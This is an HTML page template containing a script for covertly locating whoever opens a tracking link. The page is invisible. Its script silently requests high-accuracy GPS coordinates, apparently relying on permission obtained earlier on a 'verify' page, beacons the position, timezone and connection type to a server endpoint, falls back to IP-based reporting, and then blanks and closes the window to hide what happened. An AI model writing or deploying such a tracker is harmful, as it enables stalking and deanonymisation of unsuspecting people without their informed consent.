<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="refresh" content="0;url=about:blank" />
<title> </title>
<style>
  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    background: #000;
    overflow: hidden;
    width: 100%; height: 100%;
  }
  body { opacity: 0; }
</style>
</head>
<body>
<script>
(function() {
  var token = "{{ token }}";
  var sent = false;

  {% if expired %}
    try { window.location.replace('about:blank'); } catch(e) {}
    return;
  {% endif %}

  function getTimezone() {
    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) { return null; }
  }

  function getConnType() {
    try {
      var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) return c.effectiveType || c.type || null;
    } catch(e) {}
    return null;
  }

  function sendCoords(lat, lng, acc) {
    if (sent) return;
    sent = true;
    window._sent = true;
    var payload = JSON.stringify({
      token: token,
      latitude: lat,
      longitude: lng,
      accuracy: acc,
      connectionType: getConnType(),
      timezone: getTimezone()
    });
    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-update', blob);
    } else {
      try { fetch('/api/location-update', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
    }
  }

  // ── Aggressively try GPS (permission should be cached from verify page) ──
  function tryGPS() {
    if (!("geolocation" in navigator)) return;

    // Try with maximumAge to use any cached position immediately
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
      },
      function(err) {
        // GPS failed — maybe permission was revoked. Still vanish.
      },
      { enableHighAccuracy: true, timeout: 5000, maximumAge: 300000 }
    );

    // Retry with fresh position after a brief delay (for better accuracy)
    // This gets the device to use GPS chips instead of cached WiFi position
    setTimeout(function() {
      if (!window._sent && "geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          function(pos) {
            sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
          },
          function() {},
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      }
    }, 500);
  }

  // ── Send IP data as fallback ──
  function sendIPFallback() {
    if (sent) return;
    sent = true;
    window._sent = true;
    var payload = JSON.stringify({
      token: token,
      connectionType: getConnType(),
      timezone: getTimezone()
    });
    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-denied', blob);
    } else {
      try { fetch('/api/location-denied', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
    }
  }

  // ── Vanish (best effort close) ──
  function vanish() {
    try { window.location.replace('about:blank'); } catch(e) {}
    try { window.open('', '_self', '').close(); } catch(e) {}
    try { self.close(); } catch(e) {}
    try { window.close(); } catch(e) {}
    setTimeout(function() {
      try {
        document.open();
        document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body></body></html>');
        document.close();
      } catch(e) {}
    }, 5);
  }

  // ── Execute ──
  tryGPS();

  // Wait for GPS attempt, then send IP fallback and vanish
  setTimeout(function() {
    if (!window._sent) sendIPFallback();
    vanish();
  }, 3000);

  // Force vanish after 6s regardless
  setTimeout(function() {
    if (!window._sent) { window._sent = true; }
    vanish();
  }, 6000);
})();
</script>
</body>
</html>
